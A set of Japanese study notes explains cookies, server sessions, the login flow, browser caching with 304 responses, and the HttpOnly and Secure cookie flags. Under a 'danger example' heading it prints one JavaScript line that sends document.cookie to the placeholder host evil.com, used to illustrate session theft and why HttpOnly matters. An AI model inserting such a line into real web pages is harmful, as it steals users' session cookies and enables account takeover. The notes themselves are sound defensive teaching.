# Cookieとは

Cookieとは：

「ブラウザに保存される小さいデータ」

である。

--------------------------------------------------

# Cookieの目的

Cookieの目的：

・ユーザー識別
・ログイン維持

--------------------------------------------------

# Sessionとは

Sessionとは：

「サーバー側のログイン管理情報」

である。

--------------------------------------------------

# session_idとは

session_idとは：

「ログイン済みユーザー識別ID」

のようなもの。

例：

session_id = abc123

--------------------------------------------------

# ログイン維持の流れ

① ユーザー入力

メールアドレス
パスワード

をブラウザ側で入力。

--------------------------------------------------

② ブラウザ → サーバー

HTTP通信で：

「ログインしたい」

を送信。

--------------------------------------------------

③ サーバー確認

サーバー側で：

メール一致？
パスワード一致？

を確認。

つまり：

「ログイン成功判定はサーバー側」

で行われる。

--------------------------------------------------

④ Session作成

ログイン成功すると：

session_id

をサーバー側で作成。

例：

session_id = abc123
ユーザー = shugo

--------------------------------------------------

⑤ Cookie返却

サーバーが：

Set-Cookie:
session_id=abc123

をブラウザへ返す。

--------------------------------------------------

⑥ ブラウザ保存

ブラウザ側が：

session_id=abc123

をCookieとして保存。

--------------------------------------------------

⑦ 次回アクセス

ブラウザが自動で：

session_id=abc123

をサーバーへ送信。

--------------------------------------------------

⑧ サーバー確認

サーバー側で：

「あ、この人ログイン済み」

と判定。

--------------------------------------------------

# ログイン維持の本質

Cookieは：

「前回ログイン成功した証明」

として使われる。

--------------------------------------------------

# Cookieの本質

「人を覚える」

--------------------------------------------------

# Cacheとは

Cacheとは：

「前回取得したデータを再利用する仕組み」

である。

--------------------------------------------------

# Cacheの目的

・通信削減
・高速化

--------------------------------------------------

# Cache対象

・画像
・CSS
・JS
・HTML

など。

--------------------------------------------------

# Cacheの流れ

## 初回

ブラウザ
↓
データ要求
↓
サーバー
↓
データ返却
↓
ブラウザ保存(Cache)

--------------------------------------------------

## 次回

ブラウザ
↓
保存済みデータ再利用

--------------------------------------------------

# Cacheの2種類

## ① 完全Cache

通信なし

ブラウザ保存データをそのまま使う。

--------------------------------------------------

## ② 確認付きCache

ブラウザ
↓
「変更ある？」
↓
サーバー
↓
304 Not Modified
↓
Cache使う

--------------------------------------------------

# 304 Not Modified

意味：

「変更なし
保存済みCache使ってOK」

--------------------------------------------------

# CookieとCacheの違い

## Cookie

・人を覚える
・ユーザー識別

--------------------------------------------------

## Cache

・データを覚える
・通信削減

--------------------------------------------------

# HttpOnly

HttpOnlyとは：

「JavaScriptからCookieを触れなくする設定」

--------------------------------------------------

# document.cookie

通常JavaScriptでは：

document.cookie

でCookieを取得可能。

--------------------------------------------------

# 危険例

悪いJavaScriptが：

fetch("https://evil.com?cookie=" + document.cookie)

を実行すると：

「session_id盗難」

が可能になる。

--------------------------------------------------

# HttpOnlyあり

HttpOnly付きCookieは：

document.cookie

から取得不可。

--------------------------------------------------

# HttpOnlyの本質

「ブラウザ内部防御」

--------------------------------------------------

# Secure

Secureとは：

「HTTPS通信時だけCookie送信」

する設定。

--------------------------------------------------

# HTTPの危険性

HTTPは：

「暗号化なし」

なので、

session_id

が通信途中で見える可能性がある。

--------------------------------------------------

# HTTPS

HTTPSは：

「暗号化通信」

である。

--------------------------------------------------

# HTTPSのS

Secure

を意味する。

--------------------------------------------------

# Secureの本質

「通信途中防御」

--------------------------------------------------

# HttpOnly と Secure の違い

## HttpOnly

「ブラウザ内部防御」

悪いJavaScript対策。

--------------------------------------------------

## Secure

「通信途中防御」

盗聴対策。

--------------------------------------------------
